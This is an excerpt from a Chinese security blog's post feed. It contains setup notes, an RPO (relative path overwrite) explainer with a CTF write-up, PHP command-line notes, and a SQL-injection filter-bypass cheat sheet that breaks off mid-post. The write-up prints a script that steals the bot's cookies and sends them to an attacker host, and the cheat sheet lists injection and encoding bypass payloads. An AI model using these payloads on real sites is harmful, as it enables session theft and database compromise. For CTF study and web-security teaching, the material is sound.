源码</span><br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br><span class="hljs-comment">##测试版源</span><br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-proposed main restricted universe multiverse<br><span class="hljs-comment"># Canonical 合作伙伴和附加</span><br>deb http:<span class="hljs-regexp">//</span>archive.canonical.com<span class="hljs-regexp">/ubuntu/</span> xenial partner<br>deb http:<span class="hljs-regexp">//</span>extras.ubuntu.com<span class="hljs-regexp">/ubuntu/</span> xenial main<br></code></pre></td></tr></table></figure><h4 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><pre><code class="hljs">sudo apt-get install zsh</code></pre><h5 id="设置zsh-为默认的shell"><a href="#设置zsh-为默认的shell" class="headerlink" title="设置zsh 为默认的shell"></a>设置zsh 为默认的shell</h5><pre><code class="hljs">sudo chsh -s $(which zsh)</code></pre><h5 id="安装Oh-My-Zsh"><a href="#安装Oh-My-Zsh" class="headerlink" title="安装Oh-My-Zsh"></a>安装Oh-My-Zsh</h5><pre><code class="hljs">sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code></pre><h5 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h5><pre><code class="hljs">vim  /home/k0rz3n/.zshrcZSH_THEME=&quot;random&quot;ZSH_THEME_RANDOM_CANDIDATES=( &quot;robbyrussell&quot; &quot;agnoster&quot; &quot;ys&quot; )</code></pre>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>配置 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RPO攻击方式的探究</title>
    <link href="/2018/03/28/RPO%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
    <url>/2018/03/28/RPO%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E7%9A%84%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<p>原文已首发在 freebuf</p><p><a href="http://www.freebuf.com/articles/web/166731.html">http://www.freebuf.com/articles/web/166731.html</a></p><h2 id="什么是RPO？"><a href="#什么是RPO？" class="headerlink" title="什么是RPO？"></a>什么是RPO？</h2><p>RPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从而触发xss等进一步的攻击手段。</p><span id="more"></span><h2 id="在什么情况下漏洞会触发"><a href="#在什么情况下漏洞会触发" class="headerlink" title="在什么情况下漏洞会触发"></a>在什么情况下漏洞会触发</h2><p>触发这个漏洞有两个基本的前提：</p><p>①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。</p><p>②存在相对路径的js或者css的引用</p><h2 id="对第一个前提的理解"><a href="#对第一个前提的理解" class="headerlink" title="对第一个前提的理解"></a>对第一个前提的理解</h2><p>我在RPO目录下新建了两个php文件apache.php 和 nginx.php 访问成功就会分别输出Apache 和 Nginx ，还有一个空的test目录。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%901.png" alt="此处输入图片的描述"></p><p>简单的测试如下：</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%902.png" alt="此处输入图片的描述"></p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%90_3.png" alt="此处输入图片的描述"></p><p>可以清楚地看到对于完全相似的URL，不同的服务器的处理方式是不同的：Apache服务器默认情况下不认识..%2f这个符号，认为..%2fapache.php是一个文件<br>​<br>    <code>http://localhost/RPO/test/..%2fapache.php  =&gt;   ..%2fapache.php</code>     (&#x3D;_&#x3D;)|||<br>所以没有找到。</p><p>但是Nginx不同，它能自动地把..%2f进行url解码，转化为..&#x2F; 这个符号对于服务器来说就是向前跳转一个目录，在它眼中我们请求的就是<br>​<br>   <code> http://localhost/RPO/test/../nginx.php =&gt; http://localhost/RPO/nginx.php</code></p><p>于是就访问到了我们RPO目录下的nginx.php.</p><h2 id="两个前提结合起来会发生什么？"><a href="#两个前提结合起来会发生什么？" class="headerlink" title="两个前提结合起来会发生什么？"></a>两个前提结合起来会发生什么？</h2><h3 id="①我们可以跨目录读取js"><a href="#①我们可以跨目录读取js" class="headerlink" title="①我们可以跨目录读取js"></a>①我们可以跨目录读取js</h3><p>实验环境：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%904.png" alt="此处输入图片的描述"></p><p>RPO 目录下创建了index.php f访问之后就会加载本目录下的a.js,注意这个a.js前面没有&#x2F;（斜杠）代表是相对路径<br>文件内容如下：</p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=a.js&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpecho &quot;js in test folder&quot;;?&gt;</code></pre><p>与index.php同目录下的test文件夹中有a.js,一旦被调用就会弹出对话框<br>​<br>    alert(“Read file successfully”);</p><p>我们访问 </p><pre><code class="hljs">localhost/RPO/test/..%2findex.php</code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%906.png" alt="此处输入图片的描述"></p><p>惊奇的发现本来只能读取和自己在同一目录下的a.js的index.php居然成功访问到了test目录下的a.js<br>(css也是一样的原理，不再赘述)</p><h4 id="下面我们来分析一下上面的弹窗究竟是怎么实现的"><a href="#下面我们来分析一下上面的弹窗究竟是怎么实现的" class="headerlink" title="下面我们来分析一下上面的弹窗究竟是怎么实现的"></a>下面我们来分析一下上面的弹窗究竟是怎么实现的</h4><p>1.我们向服务器提交我们想请求的URL<br>​<br>   <code> http://localhost/RPO/test/..%2findex.php</code></p><p>2.（久经沙场，善于识破伪装的）服务器会把..%2f自动进行URL解码，所以实际上服务器端看到你请求的URL是下面的样子：</p><p>   <code> http://localhost/RPO/test/../index.php</code></p><p>3.我们知道..&#x2F; 在URL中会被理解成上一层目录，所以服务器实际上认为你访问的是下面的URL，并把index.php的内容返回给（天真的）浏览器</p><p>   <code> http://localhost/RPO/index.php</code></p><p>4.接下来浏览器的工作就是根据URL的路径处理index.php中引用的使用相对地址的脚本，可是万万没想到，浏览器它并不认识..%2f（惊恐脸，说实话，估计它自己都不相信，在它天真的眼中一切都是没有伪装的，它看不破%2f的伪装),于是URL在它眼里依旧是那时（青涩的）模样：</p><p>   <code> http://localhost/RPO/test/..%2findex.php</code></p><p>5.此时无知的浏览器已经把..%2findex.php当成了一个文件，可它还是严格按照脚本的要求加载当前目录下的a.js文件，而对它来说现在的当前目录已变成了test，自然而然test目录下的a.js就被成功加载了。<br>​    </p><h3 id="可是利用价值在哪？"><a href="#可是利用价值在哪？" class="headerlink" title="可是利用价值在哪？"></a>可是利用价值在哪？</h3><p>有的人可能会问了，如果要利用这个漏洞（比如说想实现xss），我们必须要让页面引入我们的攻击脚本，但是是个人都明白，真实环境中网站是人家写的，我们没法控制人家的js脚本在哪，更没法把我们想要的语句添加进人家的脚本里。</p><p>一点都没有错，于是RPO真正的利用点来了！！！！前方高能….</p><h3 id="②我们可以将服务器返回的内容按照js脚本的方式解析"><a href="#②我们可以将服务器返回的内容按照js脚本的方式解析" class="headerlink" title="②我们可以将服务器返回的内容按照js脚本的方式解析"></a>②我们可以将服务器返回的内容按照js脚本的方式解析</h3><p>等等，你没有听错！！服务器给你什么你都能当做js，而且因为是外部引用js，按照规定我们的js代码甚至不需要标签，那岂不是美滋滋???（但是这里有一个限制，就是必须是使用的URL_WRITE的网站）</p><p>可能有些童鞋不知道什么是URL重写，为了不影响下面的分析，我简单的介绍一下。</p><p>介绍URL重写之前先介绍两个概念：<br>动态URL:</p><pre><code class="hljs">形如：http://www.xxx.com/news/index.asp?id=123</code></pre><p>（伪）静态URL：<br>​<br>   <br>形如：<a href="http://www.123.com/news/123.html">http://www.123.com/news/123.html</a>    （甚至可以是任何想要的形式）</p><p>URL重写在行业内又被形象地称为”URL路由”,就相当于是一个反向代理，你发送给服务器的URL并不会直接被解析，而是要先经过一个中转站，将静态URL重新组合成服务器熟悉的动态URL形式，再对其进行解析。那为什么要这么做呢？因为（伪）静态的URL更有利于网站的优化。</p><h4 id="简单的演示："><a href="#简单的演示：" class="headerlink" title="简单的演示："></a>简单的演示：</h4><p>现在我配置好了apache的URL_REWRITE </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%907.png" alt="此处输入图片的描述"></p><h4 id="模拟攻击过程"><a href="#模拟攻击过程" class="headerlink" title="模拟攻击过程"></a>模拟攻击过程</h4><p>index.php</p><pre><code class="hljs">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;RPO attack test&lt;/head&gt;&lt;body&gt;    &lt;script src=&quot;3.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(E_ALL^E_NOTICE^E_WARNING);if($_GET[&#39;page&#39;])&#123;$a=$_GET[&#39;page&#39;];Header(&#39;Location:http://localhost/RPO/test/&#39;.&quot;$a&quot;.&#39;.html&#39;);&#125;?&gt;</code></pre><p>3.html<br>​<br>       alert(“RPO attack”);</p><p>可以看到我在index.php中引入了当前页面中的a.js,3.html 中写入了一个没有<code>&lt;script&gt;</code>标签的JS语句</p><p>现在我们访问下面的URL</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E5%88%86%E6%9E%908.png" alt="此处输入图片的描述"></p><p>可以看到我们成功将3.html的文件中的没有<code>&lt;script&gt;</code>标签的js语句解析，攻击完成。</p><p>我来给大家解释一下上面的过程：</p><p>1.你向服务器请求URL:<br>​<br>   <code>http://localhost/RPO/index.php/page/3/..%2f..%2f..%2findex.php</code></p><p>2.服务器看到的是：<br>​<br>    <code>http://localhost/RPO/index.php/page/3/../../../index.php </code></p><p>3.服务器返回index.php页面给浏览器</p><pre><code class="hljs"> http://localhost/RPO/index.php</code></pre><p>4.浏览器加载index.php文件，并加载同目录下的3.js，但是浏览器看到的URL是：</p><pre><code class="hljs">http://localhost/RPO/index.php/page/3/..%2f..%2f..%2findex.php</code></pre><p>5.浏览器认为..%2f..%2f..%2findex.php是一个页面，自然而然加载的URL就是:</p><pre><code class="hljs">http://localhost/RPO/index.php/page/3/3.js</code></pre><p>6.由于我们的请求是由<code>&lt;script src=...&gt;</code>生成的，所以返回给我们的东西都会被浏览器当做是js解析。</p><p>（我之前对这个东西也是糊里糊涂的，于是特地请教了出题人：由于<br>​<br>    <code>http://localhost/RPO/index.php/page/3/</code><br> 是一个能够请求的页面所以其之后的3.js至少会交给&#x2F;3处理，就像</p><pre><code class="hljs">http://localhost/RPO/index.php/page/3/</code></pre><p>的内容会被index.php处理一样 然后&#x2F;3返回给<code>&lt;script&gt;</code>标签。这就是为什么3页面会被当做js解析。）</p><p>##进入实战<br>2018年的强网杯有一道bendawang师傅出的web题目用到了RPO的攻击手段与xss相结合，个人认为非常经典特地拿出来跟大家分享一下（RPO 的基础部分之前我已经讲过了，在此不再赘述，这里就重点讲讲RPO的利用）：</p><p>##分析<br>题目给了一个简单的分享平台<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A53.png" alt="此处输入图片的描述"></p><p>左侧的write界面可以写入用户自定义的内容</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A54.png" alt="此处输入图片的描述"></p><p>经过测试在write里面写的任何关于xss的payload都会被完全转义之后显示在overview中，比如我们写一个经典的payload</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A59.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A56.png" alt="此处输入图片的描述"></p><p>查看源代码就能发现所有的标签都被过滤了，根本不存在xss</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A58.png" alt="此处输入图片的描述"></p><p>Rexport 界面是一个提交url漏洞的地方，我测试发现这里面输入的链接会被请求，也就是说这里面存在一个xssbot,当然题目也提示了使用的是phantomjs2.1版本，但是奇怪的是始终收不到bot的cookie（因为overview界面的完全过滤，这里又收不到cookie，再加上这个提示还以为是出题人挖了phantomjs的洞绕过了httponly，怼了n长时间后来与出题人交流得知这个hint的目的是让比赛选手注意环境的差异在用phantomjs本地仔细测试…..晕)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A55.png" alt="此处输入图片的描述"></p><p>既然bot直接访问是没有cookie的，自然就想到使用Js读取，但是问题在于没法在report页面植入js，只能用别的地方的js，允许我们自定义的只有write页面，但是用于浏览写入内容的网页<code>http://xx.xx.xx.xx:20000/index.php/view/article/xxxx</code>中的js已经被转义，标签失效。可我们只有让这个页面被当做js解析才能运行js，自然想到了改变页面解析方式的漏洞RPO。</p><p>由于RPO是要利用相对路径攻击的，于是快速翻阅了一下网站的源码，被我在index.php页面找到这样一个相对路径js的引用</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO1.png" alt="此处输入图片的描述"></p><p>我的目的是让服务器认为我请求的是index.php,接下来当浏览器去解析index.php中的相对路径的js的时候最终解释到的是<code>http://39.107.33.96:20000/index.php/view/article/xxxx/static/js/jquery.min.js</code><br>(如果你奇怪为什么index.php文件后面还有目录结构，那请你回看我上面的原理解释，这里由于开发框架的原因做了URL_REWRITE)<br>构造payload(下面的md5自己写脚本跑一下就行了,由于不是重点不详细说明):</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO6.png" alt="此处输入图片的描述"></p><p>这样我们就成功的能使bot访问我们写好js的页面了（由于过滤了引号等我们采用String.fromCharCode绕过）</p><p>其实这里还有一个坑点：<br>由上面的图可知，write页面有两个输入框，我们的payload不能写在标题栏，因为标题栏会自动为我们的内容加上<h>标签，因为js没有css的容错性，遇到无法解析的内容就会停止工作，因此攻击会失败。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A5_1.png" alt="此处输入图片的描述"></p><p>页面内容就是让bot带着自己的cookie访问我的服务器</p><p>成功返回给我cookie</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO7_.png" alt="此处输入图片的描述"></p><p>虽然没得到flag但是得到了重要提示</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO8.png" alt="此处输入图片的描述"></p><p>意思是让我们得到&#x2F;QWB_f14g&#x2F;QWB&#x2F;这个目录的cookie<br>(这里涉及到了cookie 的路径的问题，简单的讲就是当你访问一个网站的时候，只有当网站目录路径是你cookie路径的子路径的时候浏览器才会把cookie给服务器，正是所谓的父传子子传孙)</p><p>要实现这个功能需要动态创建iframe 标签去加载这个目录，然后bot访问得到cookie，在带着这个cookie去访问我们自己的服务器，具体的脚本借鉴于2017年国赛的一道题的wp<br>​   </p><pre><code class="hljs">var iframe = document.createElement(&quot;iframe&quot;);iframe.src = &quot;/QWB_f14g/QWB/&quot;;iframe.id = &quot;frame&quot;;document.body.appendChild(iframe);iframe.onload = function ()&#123; var c = document.getElementById(&#39;frame&#39;).contentWindow.document.cookie;var n0t = document.createElement(&quot;link&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);n0t.setAttribute(&quot;href&quot;, &quot;http://xx.xx.xx.xx?flag=&quot; + c);document.head.appendChild(n0t);&#125;</code></pre><p>和上面一样，我们要利用的页面过滤了引号如图</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO%E8%A1%A510.png" alt="此处输入图片的描述"></p><p>使用常见的String.fromCharCode()进行编码绕过即可</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO_11.png" alt="此处输入图片的描述"></p><p>get flag </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO13.png" alt="此处输入图片的描述"></p><p>解码</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/RPO14.png" alt="此处输入图片的描述"></p><p>当然我在网上无意间看到了另一种解法，思路也很清晰，这里给出链接<br><a href="https://mp.weixin.qq.com/s/xEBr7JxbSTt11oiBsgc3uw">https://mp.weixin.qq.com/s/xEBr7JxbSTt11oiBsgc3uw</a></p><p>参考链接：</p><p><a href="http://blog.nsfocus.net/rpo-attack/">http://blog.nsfocus.net/rpo-attack/</a></p><p><a href="https://www.lorexxar.cn/2017/07/11/guosai2017/">https://www.lorexxar.cn/2017/07/11/guosai2017/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全  漏洞  CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php命令行的使用</title>
    <link href="/2017/11/28/php%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%87%E5%BF%98/"/>
    <url>/2017/11/28/php%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%87%E5%BF%98/</url>
    
    <content type="html"><![CDATA[<h3 id="简析php命令行的使用"><a href="#简析php命令行的使用" class="headerlink" title="简析php命令行的使用"></a>简析php命令行的使用</h3><p>我们都知道PHP是web服务器的重要脚本语言，其实PHP不仅可以在服务器端执行还能在命令行执行，接下来我们就简单介绍一下。</p><p>任何一个php 的版本都会有自己对应的php.exe在安装PHP的目录下，我的安装目录是 D:&#x2F;wamp&#x2F;bin&#x2F;php&#x2F;php5.5.12</p><p>我们在命令行进入这个目录就可以直接执行命令了，接下来我们介绍一下常用的命令</p><span id="more"></span><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>php -v  #查看当前的php版本</p><p>php -m #查看当前加载的有效模块</p><p>php -i # 显示没有html格式的phpinfo</p><p>php -ini  # 显示配置文件的信息<br>(php -ini | grep -i ‘检索关键字’这样可以快速查找信息)</p><p>php -f hello.php   #在命令行中运行php程序</p><p>php -l hello.php   # 自动检查语法错误</p><p>php -rf function  #查看函数语法简介</p><h4 id="原始文档"><a href="#原始文档" class="headerlink" title="原始文档"></a>原始文档</h4><pre><code class="hljs">Usage: php [options] [-f] &lt;file&gt; [--] [args...]   php [options] -r &lt;code&gt; [--] [args...]   php [options] [-B &lt;begin_code&gt;] -R &lt;code&gt; [-E &lt;end_code&gt;] [--] [args...]   php [options] [-B &lt;begin_code&gt;] -F &lt;file&gt; [-E &lt;end_code&gt;] [--] [args...]   php [options] -S &lt;addr&gt;:&lt;port&gt; [-t docroot]   php [options] -- [args...]   php [options] -a  -a               Run interactively  -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory  -n               No php.ini file will be used  -d foo[=bar]     Define INI entry foo with value &#39;bar&#39;  -e               Generate extended information for debugger/profiler  -f &lt;file&gt;        Parse and execute &lt;file&gt;.  -h               This help  -i               PHP information  -l               Syntax check only (lint)  -m               Show compiled in modules  -r &lt;code&gt;        Run PHP &lt;code&gt; without using script tags &lt;?..?&gt;  -B &lt;begin_code&gt;  Run PHP &lt;begin_code&gt; before processing input lines  -R &lt;code&gt;        Run PHP &lt;code&gt; for every input line  -F &lt;file&gt;        Parse and execute &lt;file&gt; for every input line  -E &lt;end_code&gt;    Run PHP &lt;end_code&gt; after processing all input lines  -H               Hide any passed arguments from external tools.  -S &lt;addr&gt;:&lt;port&gt; Run with built-in web server.  -t &lt;docroot&gt;     Specify document root &lt;docroot&gt; for built-in web server.  -s               Output HTML syntax highlighted source.  -v               Version number  -w               Output source with stripped comments and whitespace.  -z &lt;file&gt;        Load Zend extension &lt;file&gt;.  args...          Arguments passed to script. Use -- args when first argument               starts with - or script is read from stdin  --ini            Show configuration file names  --rf &lt;name&gt;      Show information about function &lt;name&gt;.  --rc &lt;name&gt;      Show information about class &lt;name&gt;.  --re &lt;name&gt;      Show information about extension &lt;name&gt;.  --rz &lt;name&gt;      Show information about Zend extension &lt;name&gt;.  --ri &lt;name&gt;      Show configuration for extension &lt;name&gt;.</code></pre>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php语法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF中注入常见技巧的汇总</title>
    <link href="/2017/11/21/mysqltrick/"/>
    <url>/2017/11/21/mysqltrick/</url>
    
    <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>打了这么长时间的CTF,也见了不少的SQL注入的题目，也该好好总结一下有哪些技巧了，持续更新（自己总结外加搜集，老鸟飘过，大牛勿喷）。。。</p><h2 id="order-by-过滤"><a href="#order-by-过滤" class="headerlink" title="order by 过滤"></a>order by 过滤</h2><p>两个都可以用来判断列数，但是两者是有区别的<br>1.order by 是你select 了几个就可以在那几个的范围里面变动，超过就报错。</p><span id="more"></span><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby1.png" alt="orderby1"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/orderby23.png" alt="orderby23"></p><p>into 就比较死板，必须是你select 了几个就要into 几个，少了多了都不行。而且必须是一行才可以所以必须要limit.（1.select into 本是一个备份内容的操作。2.@是一个变量符号）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/intod.png" alt="intod"></p><p>2.order by 只能在 limit前使用,into 只能在limit 之后使用<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/order%20by%20%E7%9A%84%E9%A1%BA%E5%BA%8F.png" alt="orderby的顺序"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/into%E7%9A%84%E9%A1%BA%E5%BA%8F.png" alt="into的顺序"></p><p>小结：order by 过滤了用into</p><h2 id="16进制绕过引号"><a href="#16进制绕过引号" class="headerlink" title="16进制绕过引号"></a>16进制绕过引号</h2><p>有些时候过滤了引号，导致字符串不能写入，我们可以用字符串的16进制形式绕过，这样就不需要引号了。还有hex()和unhex()这两个函数可以使用。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=&quot;users&quot;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span><br></code></pre></td></tr></table></figure><h2 id="等于号过滤使用like-或者-in-绕过"><a href="#等于号过滤使用like-或者-in-绕过" class="headerlink" title="等于号过滤使用like 或者 in 绕过"></a>等于号过滤使用like 或者 in 绕过</h2><p>等号过滤用in或like 代替</p><pre><code class="hljs">substr(password,1,1) in(&#39;p&#39;);substr(password,1,1) like(&#39;p&#39;);</code></pre><p>in 还能通过order by 指定顺序</p><pre><code class="hljs">select * from users where id IN (3,6,9,1,2,5,8,7) order by field(id,3,6,9,1,2,5,8,7);</code></pre><h2 id="代替等于号构造真值"><a href="#代替等于号构造真值" class="headerlink" title="&lt;，&gt; 代替等于号构造真值"></a>&lt;，&gt; 代替等于号构造真值</h2><p>or swords &gt; sw</p><p>or swords &lt; tw</p><p>or 1&lt;3 </p><h2 id="字符串相等绕过"><a href="#字符串相等绕过" class="headerlink" title="字符串相等绕过"></a>字符串相等绕过</h2><p>or ‘swords’ &#x3D; ‘swords’</p><h2 id="sleep过滤"><a href="#sleep过滤" class="headerlink" title="sleep过滤"></a>sleep过滤</h2><p>可以用 benchmark   BENCHMARK(count,expr)<br>BENCHMARK()函数重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用。<br><code>id=1 union select if(subtr(password,1,1) in(&#39;a&#39;),benchmark(10000000,sha(1)),0)</code>  </p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>URLEncode编码，ASCII,HEX,unicode编码绕过</p><p>1.URL编码：or 1&#x3D;1即%6f%72%20%31%3d%31</p><p>2.url双重编码; ?id&#x3D;1%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;1,2,password%252f%252a*&#x2F;FROM%252f%252a*&#x2F;Users–+</p><p>3.hex编码：见16进制绕过单引号</p><p>4.ascii编码: SELECT FROM Users WHERE username &#x3D; CHAR(101, 97, 105, 116)</p><p>或者</p><p>char(101)+char(97)+char(105)+char(116)</p><p>5.unicode编码：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">一些unicode编码举例：  <br>单引号：&#x27;<br><span class="hljs-variable">%u0027</span> <span class="hljs-variable">%u02b9</span> <span class="hljs-variable">%u02bc</span><br><span class="hljs-variable">%u02c8</span> <span class="hljs-variable">%u2032</span><br><span class="hljs-variable">%uff07</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%a7</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a7</span><br>空白：<br><span class="hljs-variable">%u0020</span> <span class="hljs-variable">%uff00</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%20</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a0</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a0</span><br>左括号(:<br><span class="hljs-variable">%u0028</span> <span class="hljs-variable">%uff08</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%28</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a8</span><br><span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a8</span><br>右括号):<br><span class="hljs-variable">%u0029</span> <span class="hljs-variable">%uff09</span><br><span class="hljs-variable">%c0</span><span class="hljs-variable">%29</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%a9</span><br><span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%a9</span><br></code></pre></td></tr></table></figure><p>6.html 实体编码：SELECT FROM Users WHERE username &#x3D; &#39;admin&#39;</p><h2 id="substr-的逗号绕过"><a href="#substr-的逗号绕过" class="headerlink" title="substr()的逗号绕过"></a>substr()的逗号绕过</h2><p>from 1 for 1 代替 substr(,1,1) </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pass <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h2 id="limit-逗号绕过"><a href="#limit-逗号绕过" class="headerlink" title="limit 逗号绕过"></a>limit 逗号绕过</h2><p>limit 1 offset 0 代替limit 0,1</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span 